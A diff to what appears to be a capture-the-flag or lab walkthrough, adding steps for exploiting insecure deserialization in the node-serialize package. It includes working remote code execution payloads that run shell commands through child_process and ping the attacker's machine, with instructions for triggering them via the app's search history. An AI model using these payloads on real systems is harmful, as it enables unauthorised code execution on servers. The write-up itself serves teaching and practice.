@@ -80,10 +80,25 @@ In the image below, you can see an example of the usage of this functionality.
 ![image](./images/2024-09-25_18h12_04.png)
 
 As your next step, you have to craft such a payload that will execute system commands on the target website.
-You can find an exmaple paylaod form the link provieded earlier.
+You can find an example payload from the link provided earlier.
 
+```
+{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}
+```
+
+To adapt this payload for our target application, we need to remove the dictionary structure, enclosing double quotes, and any escaped characters, keeping only the core payload.
+
+To test if the payload works, we can attempt to ping our attacking machine and verify whether the command executes. To detect the ping requests, start a ```tcpdump``` on the attacker machine to monitor ICMP traffic.
+```
+_$$ND_FUNC$$_function (){require('child_process').exec('ping 10.10.128.2 -c 3', function(error, stdout, stderr) { console.log(stdout) });}()
+```
+
+Keep in mind that for successful code execution, the payload must first be sent to the web application. After that, you need to send another search keyword. This way, the payload becomes your previous search query and gets unserialized when accessing the home page. The vulnerability, as mentioned earlier, lies in the unserialize function of the package, not the serialize function.
 
 ![image](./images/2024-09-25_18h22_19.png)
+
+
+
 ![image](./images/2024-09-25_18h24_52.png)
 ![image](./images/2024-09-25_18h26_10.png)
 ![image](./images/2024-09-25_18h30_58.png)
